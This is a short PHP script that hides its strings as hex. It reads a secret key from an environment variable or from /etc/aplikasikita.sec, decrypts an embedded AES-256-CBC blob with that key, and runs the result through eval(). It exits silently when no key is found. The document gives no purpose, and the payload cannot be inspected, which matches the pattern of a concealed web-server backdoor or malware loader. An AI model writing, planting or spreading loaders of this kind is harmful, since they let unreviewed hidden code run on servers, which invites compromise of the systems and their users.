<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('mZl3HZzmRhs4C56ziiUGtQ==');

$c=base64_decode(

'GBfyY7RAXqXzLEu3BPE9kU02jtpCPKYO1nRrmsF60DP7jk+vqWOg4shF2pbHUKNREHYnGHFzTYqt' .
'ZCZ0LmMo+fRFPWhuWFlXTEFMso2+umA4Ue8huaQ8rHUnIpeye0NGD0GNYH0NeoLMlnWMXib3hrSH' .
'RCzrhmS3qVdAGGAI8AAw44b6B3pEYelaDCv+LJPBZmlA5RZFGl9sc6b9EuTQxlYZ9aS9uRX8n3pH' .
'qC5dSPbCKarMHIFhv6dDmAD8kXlauFyvl3Qszx233NP9t3XTKtJk6ycQG2IxyKVdcLDzp+4rdyvs' .
'ZbZYlK8m1ziLP4Px4zbsytT7dGg86xJOMaL0KsvkCO/p0oVKJcop4WKE5IeJ0NfSijRG/RYzagcd' .
'1EaQVMAKqYvcX8DpSFandmMfhEwEO7h2kLJ5KQoTldp48PV47ISJ9kMJXfgTrZpuAXUWbB5QFov3' .
'spXMnbQtZwYgi3nXHm12lU0mfu8mQbXj/ShHodTZgbPddsyxb9JTWBXocI0DXUyPpUHoCAdefhKY' .
'0bo1WqJBvU9mm0ls+GY9jHk='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

